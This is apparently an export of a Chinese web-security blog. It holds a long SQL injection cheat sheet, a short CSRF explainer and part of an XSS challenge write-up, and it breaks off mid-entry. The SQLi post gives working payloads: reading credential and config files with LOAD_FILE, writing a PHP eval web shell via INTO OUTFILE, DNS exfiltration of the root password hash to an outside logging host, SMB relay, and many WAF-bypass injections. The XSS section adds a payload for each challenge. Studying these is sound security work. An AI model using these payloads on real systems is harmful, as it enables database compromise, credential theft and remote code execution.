(0.00 sec)mysql&gt; select * from books where book_id = 2;+---------+-------+-----------+--------+| book_id | title | author_id | genre |+---------+-------+-----------+--------+| 2 | sad | 2 | poetry |+---------+-------+-----------+--------+1 row in set (0.00 sec)mysql&gt; select * from books where book_id=2 and sleep(5);Empty set (5.00 sec)mysql&gt; select * from books where book_id=4 and sleep(5);Empty set (0.01 sec) 可以看到如果不存在此条记录，sleep()函数是会立刻返回而不是延迟5秒。这个特性有时候可以被用上。 Boolean-based1231' and ascii(substr(select database(),1,1))&gt;991' and ascii(substr((select table_name from information_schema.tables limit 0,1),1,1))&gt;90 利用sql语句执行返回值是True或False对应的页面内容会发生，来得到信息。 这里有一个sqlilabs的盲注字符猜解代码，可以看到盲注的思路 SQL注入技巧 or 注入思路这里总结了一些比较杂的注入思路或者技巧，不定期的更新。 判断已知表名的字段数12mysql&gt; select 1 and (select * from books)=1;ERROR 1241 (21000): Operand should contain 4 column(s) limit注入1SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT start,num【注入点】 由于union无法在order by语句后面，通过查看select用法，可以知道后面还有procedure和into outfile,后者这里无法利用，则尝试使用procedure MySQL默认只有analyse(),analyse的用法在这里。 1234567891011121314151617181920SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 所以最终可以结合报错注入达到目标 1procedure analyse(extractvalue(0x123,concat(0x3a3a,@@version,0x3a3a)),1) 数据溢出据说低版本有效一个查询语句如果成功的话其返回值会是0，则可以通过返回~0+1溢出来得到结果 12mysql&gt; select ~(select user())+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(user()) + 1)' 数学运算也可能产生错误，比如0/@@version，exp(710)等 12345mysql&gt; select exp(~(select*from(select user())x));ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'mysql&gt; select (select(!x-~0)from(select(select user())x)a);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))' 算是一个思路，低版本数据库有几率成功。 列名重复12mysql&gt; select * from(select * from test a join test b)c;ERROR 1060 (42S21): Duplicate column name 'id' 利用join实现相同列名重复报错 where子句不可使用，使用exists进行猜解注入点注入点不一定是url，也可能是所有资源请求(图片、HTTP头部等) group_concat()此函数内容太多有可能显示不出来，因为报错内容长度会有限制，需要分辨，或使用limit 一个一个获取 使用load_file、outfile、dumpfile读入导出文件LOAD_FILE(file_name): Reads the file and returns the file contents as a string. To use this function, the file must be located on the server host, you must specify the full path name to the file, and you must have the FILE privilege. The file must be readable by all and its size less than max_allowed_packet bytes. If the secure_file_priv system variable is set to a nonempty directory name, the file to be loaded must be located in that directory. If the file does not exist or cannot be read because one of the preceding conditions is not satisfied, the function returns NULL. 可以看出，这个可以将文件内容读入，但是要求有FILE权限且不超过最大允许大小。注意一下，MySQL有一个secure_file_priv字段，会限制读取和写入的文件路径，只有这个字段包含的路径才允许读入或写入，且数据库当前用户有FILE权限以及必须有相应文件的读写权限 secure_file_priv的值为null ，表示限制mysqld不允许导入|导出. 当secure_file_priv的值为/tmp/，表示限制mysqld的导入|导出只能发生在/tmp/目录下. 当secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制. 注意 这个FILE权限是全局的(level=Global) The FILE privilege gives you permission to read and write files on the server host using the LOAD DATA INFILE and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. A user who has the FILE privilege can read any file on the server host that is either world-readable or readable by the MySQL server. (This implies the user can read any file in any database directory, because the server can access any of those files.) The FILE privilege also enables the user to create new files in any directory where the MySQL server has write access. This includes the server’s data directory containing the files that implement the privilege tables. As a security measure, the server will not overwrite existing files. As of MySQL 5.7.17, the FILE privilege is required to use the DATA DIRECTORY or INDEX DIRECTORY table option for the CREATE TABLE statement. 例如: 1SELECT LOAD_FILE(&apos;/etc/passwd&apos;); 可以用这个去尝试获取常见的路径地址，类似于下面这种： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293WINDOWS下:c:/boot.ini //查看系统版本c:/windows/php.ini //php配置信息c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码c:/winnt/php.inic:/winnt/my.inic:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码c:\Program Files\Serv-U\ServUDaemon.inic:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此c:\Program Files\RhinoSoft.com\ServUDaemon.exeC:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件//存储了pcAnywhere的登陆密码c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机d:\APACHE\Apache2\conf\httpd.confC:\Program Files\mysql\my.iniC:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码LUNIX/UNIX 下:/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件/usr/local/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/usr/local/app/php5/lib/php.ini //PHP相关设置/etc/sysconfig/iptables //从中得到防火墙规则策略/etc/httpd/conf/httpd.conf // apache配置文件/etc/rsyncd.conf //同步程序配置文件/etc/my.cnf //mysql的配置文件/etc/redhat-release //系统版本/etc/issue/etc/issue.net/usr/local/app/php5/lib/php.ini //PHP相关设置/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/sysconfig/iptables 查看防火墙策略load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录replace(load_file(0×2F6574632F706173737764),0×3c,0×20)replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32)) load_file后面的路径可以使用0xHH格式或者char(DD,DD,DD)格式均可，在字段中想看包含有回车等信息的内容时，可以用hex转换,如下面这样： 1SELECT 1,2,hex(LOAD_FILE('/tmp/passwd.exe')); outfile 和 dumpfile: SELECT ... INTO OUTFILE writes the selected rows to a file. Column and line terminators can be specified to produce a specific output format. SELECT ... INTO DUMPFILE writes a single row to a file without any formatting. 区别在上面，可以自己试一下： 12SELECT * FROM USER INTO OUTFILE '/tmp/test'SELECT * FROM USER INTO DUMPFILE '/tmp/test' 两个经典的outfile: 12SELECT '&lt;?php eval($_POST[cmd])?&gt;' INTO OUTFILE 'D:/phpstudy/WWW/index2.php'SELECT * FROM a INTO OUTFILE 'D:/phpstudy/WWW/index2.php' 之后只要POSTphp代码即可执行任意内容。 MD5处理后字段利用的phpmd5(str,raw_output=true)输出的RAW MD5进行注入。在另一篇hackinglab writeup中已经进行了详细的讲解和分析，具体可以看这里的注入关最后一题。 带外通道带外通道攻击主要是利用其他协议或者渠道从服务器提取数据。它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.条件限制:这些函数是需要绝对路径的，以及FILE权限 DNS注入属于带外通道的一种，下面首先来分析一下原理。和其他带外通道一样，其都是引起数据库去执行其他协议。DNS注入的前提是数据库有可用的能直接或间接引发DNS解析过程的子程序 属于注入中的OOB类,其他类型如下： 根据用于数据检索的传输信道，SQLi可分为三个独立的类别：inband, inference（推理） 和out-of-band。 Inband技术使用攻击者和有漏洞的Web应用程序之间现有的渠道来提取数据。通常该通道是标准的Web服务器响应。它的成员union技术使用现有的web页面输出恶意SQL查询的执行结果，而error-based技术则引发特定的恶意SQL查询的执行结果的DBMS的错误消息。 相反的，在Inference技术中，攻击者通过应用程序表现的差异来推断数据的值。Inference技术能够逐位提取恶意SQL查询结果，却没有真正传输数据。 Inference的核心是在服务器执行一系列的布尔查询，观察和最后推导接收结果的含义。根据观察到的特性，它的成员被称为布尔型盲注（bool）和基于时间（time-based）的盲注技术。在布尔型盲注技术中，可见的网络服务器响应内容的变化被用于区分给定的逻辑问题的答案， 而在基于时间的盲注技术中则通过观察Web服务器响应时间的变化来推断答案。 Out-of-band (OOB)技术，与inband相反，使用其它传输信道获取数据，例如超文本传输协议和DNS解析协议。当详细的错误信息被禁用、结果被限制或过滤、出站过滤规则不严和/或当减少查询的数目变得极度重要时inference技术看起来像是唯一的选择，这时使用OOB技术渗透便变得十分有趣。例如，基于HTTP的OOB技术的SQL查询结果变成了发送给HTTP服务器请求的一部分（例如GET参数值）被能访问日志文件的攻击者控制时。此类的技术不像其它的主流技术被广泛应用，主要是其所需的设置非常复杂，但使用它们可以克服许多障碍（如避免不必要的数据库写入和极大地提升利用INSERT/UPDATE语句漏洞的基于时间的SQLI）。 如果能找到引起DNS解析的函数，均可以达成目的，不止以下这种UNC方式。 还有一个知识就是UNC(Universal-Naming-Convention) The Universal Naming Convention (UNC) is the naming system used in Microsoft Windows for accessing shared network folders and printers on a local area network (LAN). 简单来说，是Windows用于访问共享文件的域名转换系统。据我所知，只在Windows下可以使用，*inx下好像是不行的。语法格式是这样的：1\\host-name\share-name\file_path 我们来试一下,在浏览器里面输入\\a.b.c.d\ef,发现自动转换成file://a.b.c.d/ef: 可以看到第486条记录发现其发送了一个DNS Standard query,主机名是a.b.c.d，以及DNS响应报文。利用这个知识，结合load_file(),把盗取的数据放入域名中，实现利用： 1select load_file(&quot;\\key.yoursite.com\abc&quot;); 由于DNS信息可以被存储，所以在你服务器上可以通过记录DNS请求信息，从而实现内容记录。下面是一个典型的payload: 1SELECT LOAD_FILE(CONCAT('\\\\',(SELECT authentication_string FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc')); 注意： 可以利用ceye.io进行常见回显查看，一个非常好用的网站 如果有DNS缓存，会发送失败，需要清除系统DNS缓存 ipconfig/flushdns 发送的域名中不能有特殊符号，如图片所示，其authentication_string首字符为*,把其去掉了。 参考文章：在SQL注入中使用DNS获取数据 SMB中继注入攻击SMB协议是一个应用层文件共享协议，具体的可以看SMB wikil。这里引用一个SMB中继攻击案例来了解整个流程的。 简单来说，就是攻击者伪装成共享文件协议的主机，当源主机通过SMB协议去访问共享文件时，攻击者骗取源主机的challenge结果并伪装成了源主机。 当攻击者在其电脑上伪装并监听时，可以使用smbrelayx,在mysql上尝试访问共享文件时，会窃取mysql_server身份： 1select load_file("\攻击者ip地址"); 可以看到，mysql尝试去访问共享文件，引起了SMB协议认证，攻击者通过伪装成其他主机，盗取了身份。 绕过逗号绕过123select substr(database() from 1 for 5)select mid(database()from 1 for 5)select * from news limit 1 offset 0 &lt;&gt;比较符绕过使用greatest函数 123456mysql&gt; select greatest (1,2);+----------------+| greatest (1,2) |+----------------+| 2 |+----------------+ 单引号绕过hex()编码 1select * from Users where username=0x61646D696E; char()函数字符拼接 1select * from Users where username=char(97,100,109,105,110); 大小写绕过1?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过1?id=1+UNunionION+SEselectLECT+1,2,3-- 注释绕过12?id=1+un/**/ion+se/**/lect+1,2,3--?id=1/*!UnIoN*/SeLecT+1,2,3-- 空格绕过 字符 释义 09 HT (horizontal tab) 水平制表符 0A LF (NL line feed, new line) 换行键 0B VT (vertical tab) 垂直制表符 0C FF (NP form feed, new page) 换页键 0D CR (carriage return) 回车键 A0 特殊的空格 20 (space) 空格 12select*from books where book_id=1; 括号可以绕过空格： 1UNION(SELECT(column)FROM(table)) and/or后插入字符绕过空格任意混合+ – ~ !可以达到绕过空格的效果 12SELECT DISTINCT(db) FROM mysql.db WHERE `Host`='localhost' and-++-1=1;需要偶数个--SELECT DISTINCT(db) FROM mysql.db WHERE `Host`='localhost' and!!~~~~!1=1;需要奇数个！ 注释符&amp;引号 12SELECT DISTINCT(db) FROM mysql.db WHERE `Host`='localhost' and/**/1=1;SELECT DISTINCT(db) FROM mysql.db WHERE `Host`='localhost' and"1=1"; 编码绕过URL encoding、double url encoding、unicode encoding 认证绕过使用&quot;=&quot; 或 &quot;-&quot;绕过： 123456789select data from users where name="="select data from users where flase="select data from users where 0=0select data from users where name=''-''select data from users where name=0-0select data from users where 0=0email=''&amp;password='' 类型转换123456789' or 1=true' or 1select * from users where 'a'='b'='c'select * from users where ('a'='b')='c'select * from users where (false)='c'select * from users where (0)='c'select * from users where (0)=0select * from users where trueselect * from users 利用了mysql中的隐式转换 字符编码当客户端与mysql设置为不同的字符集时，可以使用类似ÂÃÄ这种latin1绕过检测。原理有点类似宽字符注入，也是利用了通信双方字符集类型的不同，导致转换时出现了意想不到的问题。 文章源自这里 当执行： 1set names utf8; 只更改了客户端的字符集设置utf-8，而服务器端默认的还是latin1 MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection； 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集 具体漏洞原因可以看文章，写的很清楚。这里不在叙述。 mysql会自动忽略一些不完整的字符，利用这一点，可以绕过一些逻辑。 除此之外，Mysql的容错性,也使得不同字符集的内容，可以被正确修正，这使得一些策略得以实施： 1234567891011121314151617mysql&gt; select * from books where title=&apos;Ǎdmin&apos;;+---------+-------+-----------+-------+| book_id | title | author_id | genre |+---------+-------+-----------+-------+| 5 | admin | 13 | novel |+---------+-------+-----------+-------+1 row in set (0.00 sec)mysql&gt; select * from books where title like &apos;%Ǎ%&apos;;+---------+-------+-----------+--------+| book_id | title | author_id | genre |+---------+-------+-----------+--------+| 1 | happy | 1 | novel || 2 | sad | 2 | poetry || 5 | admin | 13 | novel |+---------+-------+-----------+--------+3 rows in set (0.01 sec) 可以看到，通过Ǎ这种含有分音符的字符，可以绕过一些WAF的检测。 HTTP 参数污染不同web server对含有异常字符的参数会有不同的返回结果，有时这些响应可以被利用，以下总结来源于这里的文章 MySQL约束攻击参考于基于约束的SQL攻击.其原理是SQL在比较字符时会去掉字符串末尾的空格。其主要原因是SQL会在内部使用空格来填充字符串，以便在比较之前使他们长度保持一致。 12345678910111213141516mysql&gt; select User,authentication_string from user where User='root';+------+-----------------------+| User | authentication_string |+------+-----------------------+| root | |+------+-----------------------+1 row in set (0.01 sec)mysql&gt; select User,authentication_string from user where User='root ';+------+-----------------------+| User | authentication_string |+------+-----------------------+| root | |+------+-----------------------+1 row in set (0.00 sec) 在Insert语句中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于n个字符的话，那么仅使用字符串的前n个字符。比如特定列的长度约束为5个字符，那么在插入字符串abcdefg时，实际上只能插入字符串的前5个字符，即abcde。 利用点：如果某注册网站的注册逻辑是这样的： 1234if exist(username): return errorelse: insert(username,passwd) 我们可以去注册一个admin(包含很多空格)的一个用户名，在查询时，会返回admin的结果 1234567891011121314151617181920212223242526272829mysql&gt; CREATE TABLE users ( -&gt; username varchar(25), -&gt; password varchar(25) -&gt; );Query OK, 0 rows affected (0.09 sec)mysql&gt; INSERT INTO users -&gt; VALUES('vampire', 'my_password');Query OK, 1 row affected (0.11 sec)mysql&gt; SELECT * FROM users;+----------+-------------+| username | password |+----------+-------------+| vampire | my_password |+----------+-------------+1 row in set (0.00 sec)mysql&gt; SELECT * FROM users -&gt; WHERE username='vampire ';+----------+-------------+| username | password |+----------+-------------+| vampire | my_password |+----------+-------------+1 row in set (0.00 sec)mysql&gt; SELECT * FROM users -&gt; WHERE username='vampire 1';Empty set (0.00 sec) WAF 常见绕过方式原文章地址:这里SQL注入绕过waf和过滤机制WAF(Web Application Firewall)总体来说具有以下功能: 审计设备用来截获所有HTTP数据或者仅仅满足某些规则的会话 访问控制设备用来控制对Web应用的访问既包括主动安全模式也包括被动安全模式 架构/网络设计工具当运行在反向代理模式他们被用来分配职能集中控制虚拟基础结构等。 WEB应用加固工具这些功能增强被保护Web应用的安全性它不仅能够屏蔽WEB应用固有弱点而且能够保护WEB应用编程错误导致的安全隐患。 常见特点: 异常检测协议拒绝不符合HTTP标准的请求 增强的输入验证代理和服务端的验证而不只是限于客户端验证 白名单&amp;黑名单白名单适用于稳定的We应用黑名单适合处理已知问题 基于规则和基于异常的保护基于规则更多的依赖黑名单机制基于异常更为灵活 状态管理重点进行会话保护 另还有Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 如果对于扫描器WAF有: 扫描器指纹(head字段/请求参数值)以wvs为例会有很明显的Acunetix在内的标识 单IP+ cookie某时间段内触发规则次数 隐藏的链接标签等(&lt;a&gt;) Cookie植入 验证码验证扫描器无法自动填充验证码 单IP请求时间段内Webserver返回http状态404比例 扫描器探测敏感目录基于字典找不到文件则返回404 原文总结了9中绕过方法: 大小写混合 替换关键字 使用编码 使用注释 等价函数与命令 使用特殊符号 HTTP参数控制 缓冲区溢出 整合绕过 有些之前提到过的方法不在赘述，这里主要补充一些。 编码替换URL多次编码，用于只进行了一次解码过滤的 123456page.php?id=1%252f%252a*/UNION%252f%252a/SELECT解码1次：page.php?id=1%2f%2a*/UNION%2f%2a/SELECT解码2次：page.php?id=1/**/UNION/*/SELECT 注释常见注释: 1//, -- , /**/, #, --+,-- -, ;--a 后几个表示此行之后无效 12z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4'union%a0select pass from users# 内联注释： 只有MySQL中才能正常识别 /*!content*/ MySQL会识别出正常的内容 12index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… 这是最为常用的绕过方式！！ 等价替换有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用 函数或变量： 123456hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir() 例如: 123456?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 substr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1 特殊字符12341.使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用2.神奇的"-+."，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤3.@符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量4.Mysql function() as xxx 也可不用as和空格 select-count(id)test from users; //绕过空格限制 部分可能发挥作用的字符: 1`、~、!、@、%、()、[]、.、-、+ 、|、%00 123456789'se'+'lec'+'t'%S%E%L%E%C%T 11.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')!和()' or --+2=- -!!!'2id=1+(UnI)(oN)+(SeL)(EcT)&gt; &gt; , &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN HTTP 参数控制这里HTTP参数控制除了对查询语句的参数进行篡改还包括HTTP方法、HTTP头的控制 HPP(HTTP Parameter Polution) 12/?id=1;select+1&amp;id=2,3+from+users+where+id=1—/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users HPP又称做重复参数污染最简单的就是?uid=1&amp;uid=2&amp;uid=3对于这种情况不同的Web服务器处理方式不同 HPF(HTTP Parameter Fragment)这种方法是HTTP分割注入同CRLF略有相似之处(使用控制字符%0a、%0d等换行) 12/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— 缓冲区溢出缓冲区溢出用于对付WAF在内的软件本身有不少WAF是C语言写的而C语言自身没有缓冲区保护机制因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug从而实现绕过 1?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 SQL防御使用占位符?而不是字符串与参数的连接123$stmt = $db-&gt;prepare('update name set name = ? where id = ?');$stmt-&gt;bind_param('si',$name,$id);$stmt-&gt;execute(); 注意： 预编译不是万能的 参数占位符不能用于指定查询中的表和列的名称。 参数占位符不能用于查询的其他部分，比如ORDER BY子句中的ASC或者DESC关键词等。 例如: 1SELECT * FROM products where name=&apos;test&apos; order by id asc/desc; 常规的注入点位于test字段处，这时可以用参数话查询来从根本上杜绝SQL注入的产生，但是假设注入点位于表名products、列名id或者asc和desc关键字处，这时便无法使用参数化查询。 关闭错误提示很多基于报错注入的方式需要有回显，关闭回显可以减少服务器提供的信息。 PHP关闭魔术引号 当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。 正确的转义根据参数的输出位置，正确的转义(HTML转义等),而不是一味的使用。 转换数据类型在传入参数之前，转换参数类型为确定类型。]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF总结]]></title>
    <url>%2Fblog%2Fcsrf%2F</url>
    <content type="text"><![CDATA[Cross site request forgery 跨站请求伪造主要原理：利用浏览器保存了其他网站的cookie信息，在用户不知情的情况下，构造了请求。其利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用 用户通过浏览器正常访问A网站，浏览器会保存cookie内容，而当用户去访问hack网站时，hack网站会在不可见的地方访问A网站的某个url，由于url可以被预测，而浏览器又保存有cookie内容，使得csrf攻击成功。 CSRF利用配合点击劫持、拖拽劫持恶意网站会伪造或在其表面添加一层透明层，通过图像，伪造验证码等信息，诱导用户完成支付、购买等功能。 配合xss通过xss获取token值然后用csrf伪造身份。 常见防御方法 方法 特性 验证码 但很麻烦 GET改为 POST 攻击者可以伪造POST表单 通过REF字段判断 有些页面服务器获取不到REF，比如使用了代理 一次性CSRF token 通过加入不可预测的参数token，每次表单提交时都带上，由于不在cookie中，所以无法伪造 CSRF Token 服务器发送给客户端一个token。 客户端提交的表单中带着这个token。 如果这个token不合法，那么服务器拒绝这个请求。 核心思想是构造随机串放在非cookie字段，记为token,然后所有请求带上这个token值，这样可以防止CSRF攻击，原因是点击的URL只会附带上cookie字段而不会带上token字段,从而分辨是否为非法请求，但要注意的是，如果可以通过其他方法获取csrf token值并添加到恶意链接中，token的防御方式会失效。 一般流程如下：在用户登录后，服务端会生成一个一次性的Token，一般这个Token会保存在服务端返回给用户的页面中的一个隐藏域里。每次用户向服务端发送操作请求时会附带上这个Token，服务端也会验证这个Token是否和分发给用户的Token一致，如果请求中不存在Token或Token不正确，即判定这个请求为非法请求。这个解决方案的原理就是利用了浏览器的同源策略，即第三方无法通过AJAX等方式获取到Token值。当然了，显而易见这个Token不具备时效性。我们可以使用一个临时的作用在父子页面之间的Cookie来代替Token。 所以，一般认为安全加密的CSRF tokens是防护CSRF的关键确保CSRF token不能通过AJAX访问到! 不要创建一个/CSRF路由来获取一个token， 尤其不要在这个路由上支持CORS!]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[alert(1)-writeup]]></title>
    <url>%2Fblog%2Falert-1-writeup%2F</url>
    <content type="text"><![CDATA[alert(1) to win XSS在线练习题 Warmup123function escape(s) &#123; return '&lt;script&gt;console.log("'+s+'");&lt;/script&gt;';&#125; 基本操作： 1");alert(1)// Adobe1234function escape(s) &#123; s = s.replace(/"/g, '\\"'); return '&lt;script&gt;console.log("' + s + '");&lt;/script&gt;';&#125; 此题将&quot;进行了转义，可以再传入一个\将前面的\&quot;进行转义，使得后面的引号逃逸出来。 1\");alert(1)// JSON1234function escape(s) &#123; s = JSON.stringify(s); return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;&#125; json.stringify会转义双引号&quot;而不会转义&lt;&gt;，所以直接闭合即可 1&lt;/script&gt;&lt;script&gt;alert(1)// JavaScript123456789function escape(s) &#123; var url = 'javascript:console.log(' + JSON.stringify(s) + ')'; console.log(url); var a = document.createElement('a'); a.href = url; document.body.appendChild(a); a.click();&#125; 由于最终内容为url中，而s中的内容需要通过JSON.stringify()，所以可以使用urlencode,将&quot;用%22代替即可。 1%22);alert(1)// Markdown12345678function escape(s) &#123; var text = s.replace(/&lt;/g, '&amp;lt;').replace(/"/g, '&amp;quot;'); // URLs text = text.replace(/(http:\/\/\S+)/g, '&lt;a href="$1"&gt;$1&lt;/a&gt;'); // [[img123|Description]] text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '&lt;img alt="$2" src="$1.gif"&gt;'); return text;&#125; 发现&lt; 和 &quot; 都被转义了，而程序会将http 和 [[a|b]] 分别替代为了&lt;a&gt;和&lt;img&gt; 标签，这里我们构造，使得&lt;a&gt;标签中内嵌一个&lt;img&gt;然后前后引号进行闭合，从而进行逃逸，结果如下： 1[[a|http://onerror='alert(1)']] DOM12345678910function escape(s) &#123; // Slightly too lazy to make two input fields. // Pass in something like "TextNode#foo" var m = s.split(/#/); // Only slightly contrived at this point. var a = document.createElement('div'); a.appendChild(document['create'+m[0]].apply(document, m.slice(1))); return a.innerHTML;&#125; 这里需要一个脑洞，就是create+m[0] 如果m[0]是某些字段，使得其成为关键字，创建某些节点。1Comment#--&gt;&lt;img src=x onerror=alert(1)&gt;&lt;!-- Callback123456789function escape(s) &#123; // Pass inn "callback#userdata" var thing = s.split(/#/); if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback'; var obj = &#123;'userdata': thing[1] &#125;; var json = JSON.stringify(obj).replace(/&lt;/g, '\\u003c'); return "&lt;script&gt;" + thing[0] + "(" + json +")&lt;/script&gt;";&#125; 使用&#39;进行闭合，使其成为一个字符串。之后即可 1'#';alert(1)// Skandia123function escape(s) &#123; return '&lt;script&gt;console.log("' + s.toUpperCase() + '")&lt;/script&gt;';&#125; 由于使用了Upper函数，js函数会失效，而使用标签是可以的。这里使用HTML实体编码，大写后依然有效。 1");&gt;&lt;/script&gt;&lt;img src=# onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; Template1234567891011121314151617181920212223242526function escape(s) &#123; function htmlEscape(s) &#123; return s.replace(/./g, function(x) &#123; return &#123; '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '&amp;': '&amp;amp;', '"': '&amp;quot;', "'": '&amp;#39;' &#125;[x] || x; &#125;); &#125; function expandTemplate(template, args) &#123; return template.replace( /&#123;(\w+)&#125;/g, function(_, n) &#123; return htmlEscape(args[n]); &#125;); &#125; return expandTemplate( " \n\ &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt; \n\ &lt;script&gt; \n\ var v = document.getElementById('name'); \n\ v.innerHTML = '&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;'; \n\ &lt;\/script&gt; \n\ ", &#123; name : s &#125; );&#125; 可以利用十进制或者是十六进制来替换&lt;&gt;,来绕过这个函数。 1\u003cimg src=a onerror=alert(1)\u003e JSON ][12345function escape(s) &#123; s = JSON.stringify(s).replace(/&lt;\/script/gi, ''); return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';&#125; 通过重复构造出最终结果。 1&lt;&lt;/script/script&gt;&lt;img src=# onerror=alert(1) Callback ][123456789function escape(s) &#123; // Pass inn "callback#userdata" var thing = s.split(/#/); if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback'; var obj = &#123;'userdata': thing[1] &#125;; var json = JSON.stringify(obj).replace(/\//g, '\\/'); return "&lt;script&gt;" + thing[0] + "(" + json +")&lt;/script&gt;";&#125; 基本操作 1'#';alert(1)&lt;!-- Skandia ][12345function escape(s) &#123; if (/[&lt;&gt;]/.test(s)) return '-'; return '&lt;script&gt;console.log("' + 